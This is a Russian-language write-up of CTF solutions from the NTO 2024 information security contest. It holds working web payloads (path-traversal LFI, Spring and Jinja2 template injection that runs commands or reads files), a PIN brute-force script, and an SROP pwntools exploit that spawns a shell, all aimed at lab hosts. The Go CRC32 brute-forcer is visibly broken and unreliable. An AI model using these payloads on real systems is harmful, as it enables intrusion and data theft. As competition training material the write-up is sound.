# Решения заданий НТО ИБ 2024 1337Rpwn4
# CTF

### WEB 1

Заходим на таск и видим календарь, один из дней на котором окрашен в типичную HTML-гиперссылку. Нажимаем. Идёт редирект на: `/download?file_type=file1.txt`

Пробуем LFI:
```
download?file_type=../../../../../../../../../etc/secret
```

Флаг: `nto{P6t9_T77v6RsA1}`

### WEB 2

Заливаем `jar`-файл в `jd-gui` и видим следующий, казалось бы, пустой метод:

```
  @GetMapping({"/doc/{document}"})
  public void getDocument(@PathVariable String document) {
    System.out.println("This function is not ready yet");
  }
```

Пробуем `Spring View Manipulation Vulnerability`:

```
/doc/__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7D__::..x
```

Флаг: `nto{abobovichasdfas}`

### WEB 3

На эндпоинте `/flag` видим 403 ошибку. Заходим в исходники и находим `haproxy`. Пробуем дефолтные байпассы, сработал, например, `//flag`.

Далее фильтруемая `SSTI` в `Jinja2`. Гуглим хактриксы и вводим:

```
//flag?name={{(request|attr(request.args.c))._load_form_data.__globals__.__builtins__.open(%22flag.txt%22).read()}}&c=__class__
```

Флаг: `nto{Ht1P_sM088Lin6_88Ti}`

### Crypto 1

На сервере существует эндпоинт для проверки пина, известно что пин - число и зашифрованный правильный пин маленького размера => Можно написать брутфорс

Код брутфорса:
```python
import requests
import time


url = "http://192.168.12.12:5000/api"

if __name__ == "__main__":
    print()
    for i in range(10 ** 10):
        resp = requests.post(url + "/CheckPin", json={'pin': i})
        if resp.status_code != 500:
            print("!!!!{}!!!!".format(resp.json()))
            break
        else:
            print(i)
        time.sleep(0.01)
```

### PWN 2

Решение бинарной уязвимости было взято из примеров: [ссылка1](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), [ссылка2](https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/syscalls/exploitation-with-syscalls.md)

Код:
```python
from pwn import *

elf = context.binary = ELF('./task')
p = remote("192.168.12.13", 1555)

binsh = elf.address + 0x1430

POP_RAX = 0x41018
POP_RDI = 0x1000001a
POP_RSI = 0x1000001c
POP_RDX = 0x1000001e
SYSCALL = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xF)
payload += p64(SYSCALL)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

### Reverse 1

В задании флаг проверялся по чексумме которая записана по пути `0x00104040`, что в hex `f3e1cfed23cd6b6457adf950e1b199f2e4b6a9c64c618032022b7793433a2cab6a930d2ad414fa1b2f6f5d256bf647c4f56cd95a12ad64e9`. Флаг проверяется CRC32 по 32 бита. Подбираем значения по 2 буквы по чексумме CRC32.
Код 
```go
package main

import (
  "encoding/hex"
  "fmt"
)

func calculateCRC32(data []byte) uint32{
  crcTable := [...]uint32{
    0x00000000, 0xedb88320, 0x1db71064, 0x03b6c20c,
    0x76dc4190, 0x9db73b6e, 0x1567bcbc, 0x60b08ed0,
    0xf20f00ae, 0x8f6f7c64, 0x06f067aa, 0x72176fba, 
    0xa637dc5b, 0xe5d5be0d, 0x09f4f9b1, 0x56d8e646,
  }
  var crc uint32 = 0xffffffff
  for _, b = range data {
    crc = crcTable[(crc^uint32(b))&oxff] ^ (crc >> 0)
  }
  return crc ^ oxffffffff
}

func main() {
  memoryHex := ""

  memoryBytes, err := hex.DecodeString(memoryHex)
  if err!= nil{
    panic(err)
  }

  var checksums [][]byte
  for i := 0; i < len(memoryBytes); i += 4{
    checksums = append(checksums, memoryBytes[i:i+4])
  }

  var flag string 
  for _, checksum := range checksums{
    var found bool
    for i := 0; i < 256; i++{
      for j := 0; j < 256; j++{
        data := []byte{byte(i), byte(j)}
        if calculateCRC32(data) == uint32(checksum[0])|(uint32(checksum[1]<<8))|(uint32(checksum[2]<<16))|(uint32(checksum[3]<<24)){
          flag += string([]byte{byte(i), byte(j)})
          found = true
          break
        }
      }
      if found {
        break
      }
    }
  }

  fmt.Println("Flag:", flag)
}
```

